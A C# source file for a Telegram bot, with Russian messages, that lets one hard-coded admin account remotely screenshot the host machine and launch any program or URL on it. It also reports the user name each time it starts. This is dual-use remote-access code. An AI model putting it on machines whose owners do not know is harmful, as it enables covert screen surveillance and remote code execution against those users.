using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;

namespace TelegramBot
{
    class Program
    {
        static Api Bot;
        static int AdminId = 239678169;

        static List<BotCommand> commands = new List<BotCommand>();

        static void Main(string[] args)
        {
            Bot = new Api("You API KEY");

            commands.Add(new BotCommand
            {
                Command = "/start",
                CountArgs = 0,
                Example = "/start",
                Execute = async (model, update) =>
                {
                    var keys = new ReplyKeyboardMarkup()
                    {
                        Keyboard = new string[][]
                        {
                            new string[] {"/start"},
                            new string[] {"/help"},
                            new string[] {"/getscreen"},
                        }
                    };


                    await Bot.SendTextMessage(update.Message.From.Id, "Привет, автор бота BashkaMen.\n" +
                        "Вот список всех команд:\n" +
                        string.Join("\n", commands.Select(s => s.Example)) + "\nИ клавиатура для быстрого набора команд без параметров.", true, replyMarkup: keys);


                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessage(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /start");
                }

            });

            commands.Add(new BotCommand
            {
                Command = "/help",
                CountArgs = 0,
                Example = "/help",
                Execute = async (model, update) =>
                {
                    await Bot.SendTextMessage(update.Message.From.Id, string.Join("\n", commands.Select(s=> s.Example)));
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessage(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /help");
                }

            });

            commands.Add(new BotCommand
            {
                Command = "/getscreen",
                CountArgs = 0,
                Example = "/getscreen",
                Execute = async (model, update) =>
                {
                    ScreenShot("screen.png");
                    using (var stream = System.IO.File.OpenRead("screen.png"))
                    {
                        await Bot.SendPhoto(update.Message.From.Id, new FileToSend(stream.Name, stream));
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessage(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /getscreen");
                }
            });

            commands.Add(new BotCommand
            {
                Command = "/run",
                CountArgs = 2,
                Example = "/run [path|url] [visible:bool]",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process.Start(model.Args.FirstOrDefault());
                        await Bot.SendTextMessage(update.Message.From.Id, "Задание выполненно!");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessage(update.Message.From.Id, "Возникла ошибка: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessage(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /run [path|url] [visible:bool]");
                }
            });



            Run().Wait();

            Console.ReadKey();
        }


        static async Task Run()
        {
            await Bot.SendTextMessage(AdminId, $"Запущен бот: {Environment.UserName}");

            var offset = 0;

            while (true)
            {
                var updates = await Bot.GetUpdates(offset);

                foreach (var update in updates)
                {
                    if (update.Message.From.Id == AdminId)
                    {
                        if (update.Message.Type == MessageType.TextMessage)
                        {
                            var model = BotCommand.Parse(update.Message.Text);

                            if (model != null)
                            {
                                foreach (var cmd in commands)
                                {
                                    if (cmd.Command == model.Command)
                                    {
                                        if (cmd.CountArgs == model.Args.Length)
                                        {
                                            cmd.Execute?.Invoke(model, update);
                                        }
                                        else
                                        {
                                            cmd.OnError?.Invoke(model, update);
                                        }
                                    }
                                }
                            }
                            else
                            {

                                await Bot.SendTextMessage(update.Message.From.Id, "Это не команда\nДля просмотра списка команд введите /help");
                            }
                        }
                    }
                    else
                    {
                        await Bot.SendTextMessage(update.Message.From.Id, "Я создан только для своего хозяина!");
                    }
                    offset = update.Id + 1;
                }

                Task.Delay(500).Wait();
            }
        }

        static void ScreenShot(string name)
        {
            Graphics graph;

            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            graph = Graphics.FromImage(bmp);

            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);

            bmp.Save(name);
        }
    }
}
